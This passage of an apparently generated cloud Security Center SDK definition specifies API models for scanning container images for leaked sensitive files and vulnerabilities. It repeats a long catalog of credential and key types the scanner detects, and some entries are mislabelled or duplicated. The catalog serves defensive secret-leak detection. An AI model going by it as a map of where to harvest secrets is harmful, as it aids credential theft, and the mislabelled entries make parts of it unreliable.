    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageSensitiveFileByKey',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageSensitiveFileByKey(request: DescribeImageSensitiveFileByKeyRequest): DescribeImageSensitiveFileByKeyResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageSensitiveFileByKeyWithOptions(request, runtime);
}

model DescribeImageSensitiveFileListRequest {
  criteria?: string(name='Criteria', description='The value of the sensitive file type.', example='Rails Master Key'),
  criteriaType?: string(name='CriteriaType', description='The query type of sensitive files. Valid values:

*   **SensitiveFileKey**: the alert type for sensitive files. Valid values:

    *   **npm_token**: npm access token
    *   **ftp_cfg**: FTP configuration
    *   **google\\_oauth_key**: Google OAuth key
    *   **planetscale_passwd**: PlanetScale password
    *   **github\\_ssh_key**: GitHub SSH key
    *   **msbuild\\_publish_profile**: MSBuild publish profile
    *   **fastly\\_cdn_token**: Fastly CDN token
    *   **ssh\\_private_key**: SSH private key
    *   **aws_cli**: AWS CLI credential
    *   **cpanel_proftpd**: cPanel ProFTPD credential
    *   **postgresql_passwd**: PostgreSQL password file
    *   **discord\\_client_cred**: Discord client credential
    *   **rails_database**: Rails database configuration
    *   **aws\\_access_key**: AWS access key
    *   **esmtp_cfg** :configuration of Extended Simple Mail Transfer Protocol (ESMTP)
    *   **docker\\_registry_cfg**: configuration of a Docker image repository
    *   **pem**: Privacy-Enhanced Mail (PEM)
    *   **common_cred**: common credential
    *   **sftp_cfg**: SFTP connection configuration
    *   **grafana_token**: Grafana token
    *   **slack_token**: Slack token
    *   **ec\\_private_key**: EC private key
    *   **pypi_token**: upload token for the Python Package Index (PyPI)
    *   **finicity_token**: Finicity token
    *   **k8s\\_client_key**: Kubernetes private key
    *   **git_cfg**: Git configuration
    *   **django_key**: Django key
    *   **jenkins_ssh**: Jenkins SSH configuration file
    *   **openssh\\_private_key**: OpenSSL private key
    *   **square_oauth**: OAuth credential for Square
    *   **typeform_token**: Typeform token
    *   **common\\_database_cfg**: general database connection configuration
    *   **wordpress\\_database_cfg**: WordPress database configuration
    *   **googlecloud\\_api_key**: API key for Google Cloud
    *   **vscode_sftp**: VSCode SFTP configuration
    *   **apache_htpasswd**: Apache htpasswd
    *   **planetscale_token**: PlanetScale token
    *   **contentful\\_preview_token**: preview token for Contentful
    *   **php\\_database_cfg**: database password for a PHP application
    *   **atom\\_remote_sync**: Atom remote synchronization configuration
    *   **aws\\_session_token**: AWS session token
    *   **atom\\_sftp_cfg**: Atom SFTP configuration
    *   **tencentcloud_ak**: Asana client key
    *   **tencentcloud_ak**: secret ID of a third-party cloud
    *   **rsa\\_private_key**: RSA private key
    *   **github\\_personal_token**: personal access token for GitHub
    *   **pgp**: Pretty Good Privacy (PGP) encrypted file
    *   **stripe_skpk**: Stripe secret key
    *   **square_token**: Square access token
    *   **rails_carrierwave**: file upload credential for Rails Carrierwave
    *   **dbeaver\\_database_cfg**: DBeaver database configuration
    *   **robomongo_cred**: credential for RoboMongo
    *   **github\\_oauth_token**: OAuth access token for GitHub
    *   **pulumi_token**: Pulumi token
    *   **ventrilo_voip**: configuration of a Ventrilo VoIP server
    *   **macos_keychain**: macOS keychain
    *   **amazon\\_mws_token**: Amazon MWS token
    *   **dynatrace_token**: Dynatrace token
    *   **java_keystore**: Java KeyStore (JKS)
    *   **microsoft_sdf**: Microsoft SQL Server Compact Edition (CE) database
    *   **kubernetes\\_dashboard_cred**: user credential for Kubernetes Dashboard
    *   **atlassian_token**: Atlassian token
    *   **rdp**: remote desktop protocol (RDP)
    *   **mailgun_key**: Mailgun webhook signing key
    *   **mailchimp\\_api_key**: API key for Mailchimp
    *   **netrc_cfg**: .netrc configuration file
    *   **openvpn_cfg**: OpenVPN configuration
    *   **github\\_refresh_token**: GitHub refresh token
    *   **salesforce**: Salesforce credential
    *   **salesforce**: Sendinblue credential
    *   **pkcs\\_private_key**: PKCS#12 key
    *   **rubyonrails_passwd**: Ruby on Rails password file
    *   **filezilla_ftp**: FileZilla FTP configuration
    *   **databricks_token**: Databricks token
    *   **gitLab\\_personal_toke**: personal access token for GitLab
    *   **rails\\_master_key**: Rails master key
    *   **sqlite**: SQLite3 or SQLite database
    *   **firefox_logins**: Firefox logon configuration
    *   **mailgun\\_private_token**: Mailgun private token
    *   **joomla_cfg**: Joomla configuration
    *   **hashicorp\\_terraform_token**: HashiCorp Terraform token
    *   **jetbrains_ides**: JetBrains IDEs configuration
    *   **heroku\\_api_key**: Heroku API key
    *   **messagebird_token**: MessageBird token
    *   **messagebird_token**: MessageBird token
    *   **hashicorp\\_vault_token**: HashiCorp Vault token
    *   **pgp\\_private_key**: PGP private key
    *   **sshpasswd**: SSH password
    *   **huaweicloud_ak**: secret access key of a third-party cloud
    *   **aws_s3cmd**: AWS S3cmd configuration
    *   **php_config**: PHP configuration
    *   **common\\_private_key**: private key of a common type
    *   **microsoft_mdf**: Microsoft SQL Server database
    *   **mediawiki_cfg**: MediaWiki configuration
    *   **jenkins_cred**: Jenkins credential
    *   **rubygems_cred**: RubyGems credential
    *   **clojars_token**: Clojars token
    *   **phoenix\\_web_passwd**: Phoenix web credential
    *   **puttygen\\_private_key**: PuTTYgen private key
    *   **google\\_oauth_token**: Google OAuth access token
    *   **rubyonrails_cfg**: Ruby On Rails database configuration
    *   **lob\\_api_key**: Lob API key
    *   **pkcs_cred**: PKCS#12 certificate
    *   **otr\\_private_key**: Off-the-Record Messaging (OTR) private key
    *   **contentful\\_delivery_token**: delivery token for Contentful
    *   **digital\\_ocean_tugboat**: DigitalOcean Tugboat configuration
    *   **dsa\\_private_key**: Digital Signature Algorithm (DSA) private key
    *   **rails\\_app_token**: Rails app token
    *   **git_cred**: Git user credential
    *   **newrelic\\_api_key**: User API key for New Relic
    *   **github_hub**: hub configuration for storing GitHub tokens
    *   **rubygem**: RubyGem token

*   **SensitiveFileName**: the name of the alert type for sensitive files.', example='SensitiveFileKey'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**. Default value: **1**.', example='1'),
  imageUuid?: string(name='ImageUuid', description='The UUID of the image.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the UUIDs of images from the value of the **ImageUuid** response parameter.', example='850613a48999900f48417c7e6e9dcfdd'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20.', example='20'),
  riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**', example='low'),
  scanRange?: [ string ](name='ScanRange', description='An array that consists of the types of the assets that you want to scan. Valid values:

*   **image**
*   **container**'),
}

model DescribeImageSensitiveFileListShrinkRequest {
  criteria?: string(name='Criteria', description='The value of the sensitive file type.', example='Rails Master Key'),
  criteriaType?: string(name='CriteriaType', description='The query type of sensitive files. Valid values:

*   **SensitiveFileKey**: the alert type for sensitive files. Valid values:

    *   **npm_token**: npm access token
    *   **ftp_cfg**: FTP configuration
    *   **google\\_oauth_key**: Google OAuth key
    *   **planetscale_passwd**: PlanetScale password
    *   **github\\_ssh_key**: GitHub SSH key
    *   **msbuild\\_publish_profile**: MSBuild publish profile
    *   **fastly\\_cdn_token**: Fastly CDN token
    *   **ssh\\_private_key**: SSH private key
    *   **aws_cli**: AWS CLI credential
    *   **cpanel_proftpd**: cPanel ProFTPD credential
    *   **postgresql_passwd**: PostgreSQL password file
    *   **discord\\_client_cred**: Discord client credential
    *   **rails_database**: Rails database configuration
    *   **aws\\_access_key**: AWS access key
    *   **esmtp_cfg** :configuration of Extended Simple Mail Transfer Protocol (ESMTP)
    *   **docker\\_registry_cfg**: configuration of a Docker image repository
    *   **pem**: Privacy-Enhanced Mail (PEM)
    *   **common_cred**: common credential
    *   **sftp_cfg**: SFTP connection configuration
    *   **grafana_token**: Grafana token
    *   **slack_token**: Slack token
    *   **ec\\_private_key**: EC private key
    *   **pypi_token**: upload token for the Python Package Index (PyPI)
    *   **finicity_token**: Finicity token
    *   **k8s\\_client_key**: Kubernetes private key
    *   **git_cfg**: Git configuration
    *   **django_key**: Django key
    *   **jenkins_ssh**: Jenkins SSH configuration file
    *   **openssh\\_private_key**: OpenSSL private key
    *   **square_oauth**: OAuth credential for Square
    *   **typeform_token**: Typeform token
    *   **common\\_database_cfg**: general database connection configuration
    *   **wordpress\\_database_cfg**: WordPress database configuration
    *   **googlecloud\\_api_key**: API key for Google Cloud
    *   **vscode_sftp**: VSCode SFTP configuration
    *   **apache_htpasswd**: Apache htpasswd
    *   **planetscale_token**: PlanetScale token
    *   **contentful\\_preview_token**: preview token for Contentful
    *   **php\\_database_cfg**: database password for a PHP application
    *   **atom\\_remote_sync**: Atom remote synchronization configuration
    *   **aws\\_session_token**: AWS session token
    *   **atom\\_sftp_cfg**: Atom SFTP configuration
    *   **tencentcloud_ak**: Asana client key
    *   **tencentcloud_ak**: secret ID of a third-party cloud
    *   **rsa\\_private_key**: RSA private key
    *   **github\\_personal_token**: personal access token for GitHub
    *   **pgp**: Pretty Good Privacy (PGP) encrypted file
    *   **stripe_skpk**: Stripe secret key
    *   **square_token**: Square access token
    *   **rails_carrierwave**: file upload credential for Rails Carrierwave
    *   **dbeaver\\_database_cfg**: DBeaver database configuration
    *   **robomongo_cred**: credential for RoboMongo
    *   **github\\_oauth_token**: OAuth access token for GitHub
    *   **pulumi_token**: Pulumi token
    *   **ventrilo_voip**: configuration of a Ventrilo VoIP server
    *   **macos_keychain**: macOS keychain
    *   **amazon\\_mws_token**: Amazon MWS token
    *   **dynatrace_token**: Dynatrace token
    *   **java_keystore**: Java KeyStore (JKS)
    *   **microsoft_sdf**: Microsoft SQL Server Compact Edition (CE) database
    *   **kubernetes\\_dashboard_cred**: user credential for Kubernetes Dashboard
    *   **atlassian_token**: Atlassian token
    *   **rdp**: remote desktop protocol (RDP)
    *   **mailgun_key**: Mailgun webhook signing key
    *   **mailchimp\\_api_key**: API key for Mailchimp
    *   **netrc_cfg**: .netrc configuration file
    *   **openvpn_cfg**: OpenVPN configuration
    *   **github\\_refresh_token**: GitHub refresh token
    *   **salesforce**: Salesforce credential
    *   **salesforce**: Sendinblue credential
    *   **pkcs\\_private_key**: PKCS#12 key
    *   **rubyonrails_passwd**: Ruby on Rails password file
    *   **filezilla_ftp**: FileZilla FTP configuration
    *   **databricks_token**: Databricks token
    *   **gitLab\\_personal_toke**: personal access token for GitLab
    *   **rails\\_master_key**: Rails master key
    *   **sqlite**: SQLite3 or SQLite database
    *   **firefox_logins**: Firefox logon configuration
    *   **mailgun\\_private_token**: Mailgun private token
    *   **joomla_cfg**: Joomla configuration
    *   **hashicorp\\_terraform_token**: HashiCorp Terraform token
    *   **jetbrains_ides**: JetBrains IDEs configuration
    *   **heroku\\_api_key**: Heroku API key
    *   **messagebird_token**: MessageBird token
    *   **messagebird_token**: MessageBird token
    *   **hashicorp\\_vault_token**: HashiCorp Vault token
    *   **pgp\\_private_key**: PGP private key
    *   **sshpasswd**: SSH password
    *   **huaweicloud_ak**: secret access key of a third-party cloud
    *   **aws_s3cmd**: AWS S3cmd configuration
    *   **php_config**: PHP configuration
    *   **common\\_private_key**: private key of a common type
    *   **microsoft_mdf**: Microsoft SQL Server database
    *   **mediawiki_cfg**: MediaWiki configuration
    *   **jenkins_cred**: Jenkins credential
    *   **rubygems_cred**: RubyGems credential
    *   **clojars_token**: Clojars token
    *   **phoenix\\_web_passwd**: Phoenix web credential
    *   **puttygen\\_private_key**: PuTTYgen private key
    *   **google\\_oauth_token**: Google OAuth access token
    *   **rubyonrails_cfg**: Ruby On Rails database configuration
    *   **lob\\_api_key**: Lob API key
    *   **pkcs_cred**: PKCS#12 certificate
    *   **otr\\_private_key**: Off-the-Record Messaging (OTR) private key
    *   **contentful\\_delivery_token**: delivery token for Contentful
    *   **digital\\_ocean_tugboat**: DigitalOcean Tugboat configuration
    *   **dsa\\_private_key**: Digital Signature Algorithm (DSA) private key
    *   **rails\\_app_token**: Rails app token
    *   **git_cred**: Git user credential
    *   **newrelic\\_api_key**: User API key for New Relic
    *   **github_hub**: hub configuration for storing GitHub tokens
    *   **rubygem**: RubyGem token

*   **SensitiveFileName**: the name of the alert type for sensitive files.', example='SensitiveFileKey'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**. Default value: **1**.', example='1'),
  imageUuid?: string(name='ImageUuid', description='The UUID of the image.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the UUIDs of images from the value of the **ImageUuid** response parameter.', example='850613a48999900f48417c7e6e9dcfdd'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20.', example='20'),
  riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**', example='low'),
  scanRangeShrink?: string(name='ScanRange', description='An array that consists of the types of the assets that you want to scan. Valid values:

*   **image**
*   **container**'),
}

model DescribeImageSensitiveFileListResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='1'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    lastRowKey?: string(name='LastRowKey', description='The key of the last data entry.', example='CAESGgoSChAKDGNvbXBsZXRlVGltZRABCgQiAggAGAAiQAoJAGYXFWIAAAAACjMDLgAAADFTNzMyZDMwMzAzMDM1Mzc3Njc4MzA2ODY5NmI2YTY1Nzg2NTcxNjE2NDc4NjE='),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: 20.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='149'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='8D19A089-E6BC-5244-800C-7E590D50487F'),
  sensitiveFileList?: [ 
    {
      count?: int32(name='Count', description='The number of scans that are performed on the sensitive file.', example='9'),
      firstScanTime?: long(name='FirstScanTime', description='The timestamp when the first scan was performed. Unit: milliseconds.', example='1663321552000'),
      lastScanTime?: long(name='LastScanTime', description='The timestamp when the last scan was performed. Unit: milliseconds.', example='1663321552000'),
      riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
      sensitiveFileKey?: string(name='SensitiveFileKey', description='The alert type for the sensitive file. Valid values:

*   **npm_token**: npm access token
*   **ftp_cfg**: FTP configuration
*   **google\\_oauth_key**: Google OAuth key
*   **planetscale_passwd**: PlanetScale password
*   **github\\_ssh_key**: GitHub SSH key
*   **msbuild\\_publish_profile**: MSBuild publish profile
*   **fastly\\_cdn_token**: Fastly CDN token
*   **ssh\\_private_key**: SSH private key
*   **aws_cli**: AWS CLI credential
*   **cpanel_proftpd**: cPanel ProFTPD credential
*   **postgresql_passwd**: PostgreSQL password file
*   **discord\\_client_cred**: Discord client credential
*   **rails_database**: Rails database configuration
*   **aws\\_access_key**: AWS access key
*   **esmtp_cfg** :configuration of ESMTP
*   **docker\\_registry_cfg**: configuration of a Docker image repository
*   **pem**: PEM
*   **common_cred**: common credential
*   **sftp_cfg**: SFTP connection configuration
*   **grafana_token**: Grafana token
*   **slack_token**: Slack token
*   **ec\\_private_key**: EC private key
*   **pypi_token**: upload token for the PyPI
*   **finicity_token**: Finicity token
*   **k8s\\_client_key**: Kubernetes private key
*   **git_cfg**: Git configuration
*   **django_key**: Django key
*   **jenkins_ssh**: Jenkins SSH configuration file
*   **openssh\\_private_key**: OpenSSL private key
*   **square_oauth**: OAuth credential for Square
*   **typeform_token**: Typeform token
*   **common\\_database_cfg**: general database connection configuration
*   **wordpress\\_database_cfg**: WordPress database configuration
*   **googlecloud\\_api_key**: API key for Google Cloud
*   **vscode_sftp**: VSCode SFTP configuration
*   **apache_htpasswd**: Apache htpasswd
*   **planetscale_token**: PlanetScale token
*   **contentful\\_preview_token**: preview token for Contentful
*   **php\\_database_cfg**: database password for a PHP application
*   **atom\\_remote_sync**: Atom remote synchronization configuration
*   **aws\\_session_token**: AWS session token
*   **atom\\_sftp_cfg**: Atom SFTP configuration
*   **tencentcloud_ak**: Asana client key
*   **tencentcloud_ak**: secret ID of a third-party cloud
*   **rsa\\_private_key**: RSA private key
*   **github\\_personal_token**: personal access token for GitHub
*   **pgp**: PGP encrypted file
*   **stripe_skpk**: Stripe secret key
*   **square_token**: Square access token
*   **rails_carrierwave**: file upload credential for Rails Carrierwave
*   **dbeaver\\_database_cfg**: DBeaver database configuration
*   **robomongo_cred**: credential for RoboMongo
*   **github\\_oauth_token**: OAuth access token for GitHub
*   **pulumi_token**: Pulumi token
*   **ventrilo_voip**: configuration of a Ventrilo VoIP server
*   **macos_keychain**: macOS keychain
*   **amazon\\_mws_token**: Amazon MWS token
*   **dynatrace_token**: Dynatrace token
*   **java_keystore**: JKS
*   **microsoft_sdf**: Microsoft SQL Server CE database
*   **kubernetes\\_dashboard_cred**: user credential for Kubernetes Dashboard
*   **atlassian_token**: Atlassian token
*   **rdp**: RDP
*   **mailgun_key**: Mailgun webhook signing key
*   **mailchimp\\_api_key**: API key for Mailchimp
*   **netrc_cfg**: .netrc configuration file
*   **openvpn_cfg**: OpenVPN configuration
*   **github\\_refresh_token**: GitHub refresh token
*   **salesforce**: Salesforce credential
*   **salesforce**: Sendinblue credential
*   **pkcs\\_private_key**: PKCS#12 key
*   **rubyonrails_passwd**: Ruby on Rails password file
*   **filezilla_ftp**: FileZilla FTP configuration
*   **databricks_token**: Databricks token
*   **gitLab\\_personal_toke**: personal access token for GitLab
*   **rails\\_master_key**: Rails master key
*   **sqlite**: SQLite3 or SQLite database
*   **firefox_logins**: Firefox logon configuration
*   **mailgun\\_private_token**: Mailgun private token
*   **joomla_cfg**: Joomla configuration
*   **hashicorp\\_terraform_token**: HashiCorp Terraform token
*   **jetbrains_ides**: JetBrains IDEs configuration
*   **heroku\\_api_key**: Heroku API key
*   **messagebird_token**: MessageBird token
*   **messagebird_token**: MessageBird token
*   **hashicorp\\_vault_token**: HashiCorp Vault token
*   **pgp\\_private_key**: PGP private key
*   **sshpasswd**: SSH password
*   **huaweicloud_ak**: secret access key of a third-party cloud
*   **aws_s3cmd**: AWS S3cmd configuration
*   **php_config**: PHP configuration
*   **common\\_private_key**: private key of a common type
*   **microsoft_mdf**: Microsoft SQL Server database
*   **mediawiki_cfg**: MediaWiki configuration
*   **jenkins_cred**: Jenkins credential
*   **rubygems_cred**: RubyGems credential
*   **clojars_token**: Clojars token
*   **phoenix\\_web_passwd**: Phoenix web credential
*   **puttygen\\_private_key**: PuTTYgen private key
*   **google\\_oauth_token**: Google OAuth access token
*   **rubyonrails_cfg**: Ruby On Rails database configuration
*   **lob\\_api_key**: Lob API key
*   **pkcs_cred**: PKCS#12 certificate
*   **otr\\_private_key**: OTR private key
*   **contentful\\_delivery_token**: delivery token for Contentful
*   **digital\\_ocean_tugboat**: DigitalOcean Tugboat configuration
*   **dsa\\_private_key**: Digital DSA private key
*   **rails\\_app_token**: Rails app token
*   **git_cred**: Git user credential
*   **newrelic\\_api_key**: User API key for New Relic
*   **github_hub**: hub configuration for storing GitHub tokens
*   **rubygem**: RubyGem token', example='google_oauth_key'),
      sensitiveFileName?: string(name='SensitiveFileName', description='The name of the alert type for the sensitive file.', example='AccessKeyLeak'),
    }
  ](name='SensitiveFileList', description='An array that consists of the information about the sensitive files.'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model DescribeImageSensitiveFileListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageSensitiveFileListResponseBody(name='body'),
}

async function describeImageSensitiveFileListWithOptions(tmpReq: DescribeImageSensitiveFileListRequest, runtime: Util.RuntimeOptions): DescribeImageSensitiveFileListResponse {
  Util.validateModel(tmpReq);
  var request = new DescribeImageSensitiveFileListShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.scanRange)) {
    request.scanRangeShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.scanRange, 'ScanRange', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.criteriaType)) {
    query['CriteriaType'] = request.criteriaType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageUuid)) {
    query['ImageUuid'] = request.imageUuid;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskLevel)) {
    query['RiskLevel'] = request.riskLevel;
  }
  if (!Util.isUnset(request.scanRangeShrink)) {
    query['ScanRange'] = request.scanRangeShrink;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageSensitiveFileList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageSensitiveFileList(request: DescribeImageSensitiveFileListRequest): DescribeImageSensitiveFileListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageSensitiveFileListWithOptions(request, runtime);
}

model DescribeImageStatisticsResponseBody = {
  instanceCount?: int32(name='InstanceCount', description='The number of container images in your assets. Only Container Registry Enterprise Edition instances are counted.', example='5'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4E5BFDCF-B9DD-430D-9DA4-151BCB581C9D'),
  riskInstanceCount?: int32(name='RiskInstanceCount', description='The number of container images that have security risks. Only Container Registry Enterprise Edition instances are counted.', example='2'),
}

model DescribeImageStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageStatisticsResponseBody(name='body'),
}

/**
  * Security Center can scan for security risks and collect statistics only for **Container Registry Enterprise Edition instances**.
  * >  Security Center cannot scan for security risks or collect statistics for **default** Container Registry instances.
  *
  * @param request DescribeImageStatisticsRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeImageStatisticsResponse
 */
async function describeImageStatisticsWithOptions(runtime: Util.RuntimeOptions): DescribeImageStatisticsResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeImageStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * Security Center can scan for security risks and collect statistics only for **Container Registry Enterprise Edition instances**.
  * >  Security Center cannot scan for security risks or collect statistics for **default** Container Registry instances.
  *
  * @return DescribeImageStatisticsResponse
 */
async function describeImageStatistics(): DescribeImageStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageStatisticsWithOptions(runtime);
}

model DescribeImageVulListRequest {
  aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='High severity vulnerability that affects org.eclipse.jetty:jetty-server'),
  clusterId?: string(name='ClusterId', description='The ID of the cluster to which the container belongs.', example='cc20a1024011c44b6a8710d6f8b****'),
  clusterName?: string(name='ClusterName', description='The name of the cluster.', example='docker-law'),
  containerId?: string(name='ContainerId', description='The ID of the container.', example='c08d5fc1a329a4b88950a253d082f****'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  dealed?: string(name='Dealed', description='Specifies whether the vulnerability is handled. Valid values:

*   **y**: yes
*   **n**: no', example='y'),
  digest?: string(name='Digest', description='The digest of the image.', example='8f0fbdb41d3d1ade4ffdf21558443f4c03342010563bb8c43ccc09594d507012'),
  image?: string(name='Image', description='The name of the image.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-****'),
  instanceId?: string(name='InstanceId', description='The instance ID of the asset.', example='1-qeqewqw****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  name?: string(name='Name', description='The name of the vulnerability.', example='debian:10:CVE-2019-9893'),
  namespace?: string(name='Namespace', description='The namespace.', example='test-002'),
  necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Valid values:

*   **asap**: high. You must fix the vulnerability at the earliest opportunity.
*   **later**: medium. You can fix the vulnerability based on your business requirements.
*   **nntf**: low. You can ignore the vulnerability.', example='asap'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10'),
  pod?: string(name='Pod', description='The pod.', example='22222-7xsqq'),
  regionId?: string(name='RegionId', description='The region ID of the instance.', example='cn-hangzhou'),
  repoId?: string(name='RepoId', description='The ID of the image repository.', example='qew****'),
  repoInstanceId?: string(name='RepoInstanceId', description='The instance ID of the image repository.', example='i-qewqrqcsadf****'),
  repoName?: string(name='RepoName', description='The name of the image repository.', example='libssh2'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='libssh2'),
  repoRegionId?: string(name='RepoRegionId', description='The region ID of the image repository.', example='cn-hangzhou'),
  scanRange?: [ string ](name='ScanRange', description='The types of the assets that you want to scan.'),
  statusList?: string(name='StatusList', description='The status of the vulnerability. Valid values:

*   **1**: unfixed
*   **4**: being fixed
*   **7**: fixed', example='1'),
  tag?: string(name='Tag', description='The tag that is added to the image.', example='oval'),
  type?: string(name='Type', description='The type of the vulnerability. Set the value to **CVE**, which indicates image vulnerabilities.', example='cve'),
  uuids?: string(name='Uuids', description='The UUIDs of the assets. Separate multiple UUIDs with commas (,).', example='0004a32a0305a7f6ab5ff9600d47****'),
}

model DescribeImageVulListResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D6B20156-49B0-5CF0-B14D-7ECA4B50DAAB'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  vulRecords?: [ 
    {
      aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='CVE-2018-25010:libwebp up to 1.0.0 ApplyFilter out-of-bounds read'),
      canFix?: string(name='CanFix', description='Indicates whether the vulnerability can be fixed in the Security Center console. Valid values:

*   **yes**: yes
*   **no**: no', example='yes'),
      canUpdate?: boolean(name='CanUpdate', description='Indicates whether the package of the software that has the vulnerability can be upgraded by using Security Center. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='c08d5fc1a329a4b88950a253d082f1****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='docker-law'),
      containerId?: string(name='ContainerId', description='The ID of the container.', example='04d20e98c8e2c93b7b864372084320a15a58c8671e53c972ce3a71d9c163****'),
      extendContentJson?: {
        os?: string(name='Os', description='The name of the operating system.', example='debian'),
        osRelease?: string(name='OsRelease', description='The version of the operating system in the image.', example='10.9'),
        rpmEntityList?: [ 
          {
            fullVersion?: string(name='FullVersion', description='The complete version number of the package.', example='2.3.3-4'),
            layer?: string(name='Layer', description='The SHA-256 value of the digest of the image layer.', example='b1f5b9420803ad0657cf21566e3e20acc08581e7f22991249ef3aa80b8b1c587'),
            matchDetail?: string(name='MatchDetail', description='The reason why the vulnerability is detected.', example='libseccomp2 version less than equals 2.3.3-4'),
            matchList?: [ string ](name='MatchList', description='The details of the rules that are used to detect the vulnerability.', example='["libseccomp2 version less than equals 2.3.3-4"]'),
            name?: string(name='Name', description='The name of the software package.', example='libseccomp2'),
            path?: string(name='Path', description='The path of the software that has the vulnerability.', example='/usr/lib64/libssh2.so.1'),
            updateCmd?: string(name='UpdateCmd', description='The command that is used to fix the vulnerability.', example='apt-get update && apt-get install libseccomp2  --only-upgrade'),
            version?: string(name='Version', description='The version number of the package.', example='2.3.3-4'),
          }
        ](name='RpmEntityList', description='The details of the packages of the software that has the vulnerability.'),
      }(name='ExtendContentJson', description='The extended information about the vulnerability.'),
      firstTs?: long(name='FirstTs', description='The timestamp when the first scan was performed. Unit: milliseconds.', example='1620752053000'),
      image?: string(name='Image', description='The name of the image.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-conta****'),
      imageDigest?: string(name='ImageDigest', description='The digest of the image.', example='8f0fbdb41d3d1ade4ffdf21558443f4c03342010563bb8c43ccc09594d507012'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      lastTs?: long(name='LastTs', description='The timestamp when the last scan was performed. Unit: milliseconds.', example='1631779996000'),
      layers?: [ string ](name='Layers', description='The image layers.'),
      maliciousSource?: string(name='MaliciousSource'),
